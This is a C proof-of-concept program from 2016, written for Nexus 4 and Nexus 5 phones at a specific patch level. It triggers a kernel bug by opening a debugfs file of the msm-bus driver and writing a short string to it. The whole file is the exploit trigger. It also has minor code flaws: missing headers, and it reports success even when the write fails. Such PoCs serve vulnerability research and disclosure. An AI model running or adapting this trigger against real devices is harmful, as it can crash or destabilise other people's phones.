/*
 * Copyright (C) 2016 by idhyt3r@gmail.com
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.


****************************************************************************
 trigger in:
    only test in nexus 4 and nexus 5 all version && patch level 20161005,
    maybe the bug is in other nexus.
*/

#include <stdio.h>
#include <stdlib.h>

#include <fcntl.h>

#include <errno.h>

int poc()
{
    int fd, ret;
    char *data = "idhyt";
    char *file_path = "/sys/kernel/debug/msm-bus-dbg/client-data/update-request";

    errno = 0;
    fd = open(file_path, O_RDWR);
    if (fd < 0)
    {
        printf("[-] open false: errno = %d, msg = %s\n", errno, strerror(errno));
        return -1;
    }

    unsigned int len = strlen(data);

    printf("trigger...\n");
    errno = 0;
    ret = write(fd, data, len);
    if (ret != len)
    {
        printf("[-] write false: errno = %d, msg = %s\n", errno, strerror(errno));
    }

    printf("[+] write success!\n");

    close(fd);

    return 0;
}


int main(int argc, char const *argv[])
{
    poc();
    return 0;
}


